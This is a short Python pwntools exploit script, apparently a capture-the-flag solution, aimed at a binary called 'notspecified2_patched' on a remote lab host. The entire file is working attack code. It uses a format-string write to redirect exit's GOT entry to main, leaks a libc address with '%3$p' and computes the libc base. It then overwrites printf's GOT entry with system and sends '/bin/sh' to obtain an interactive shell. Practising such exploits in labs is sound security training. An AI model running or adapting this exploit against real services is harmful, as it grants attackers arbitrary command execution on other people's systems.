from pwn import *

context.binary = binary = ELF('./notspecified2_patched',checksec=False)
libc = ELF('./libc.so.6',checksec=False)

payload = fmtstr_payload(6, {binary.got.exit:binary.symbols.main})

#p = process()
p = remote('10.10.102.129', 5000)

p.sendline(payload)
p.recvrepeat(1)

p.sendline(b'%3$p')

libc_offset = 0x114a37
p.recvuntil(b'Thanks ')
libc_leak = int(p.recvline()[:-1].decode(), 16)
libc.address = libc_leak - libc_offset

info(f'libc base: {hex(libc.address)}')

payload2 = fmtstr_payload(6, {binary.got.printf:libc.symbols.system})
p.sendline(payload2)
p.sendline(b'/bin/sh')

p.recvrepeat(1)
p.interactive()
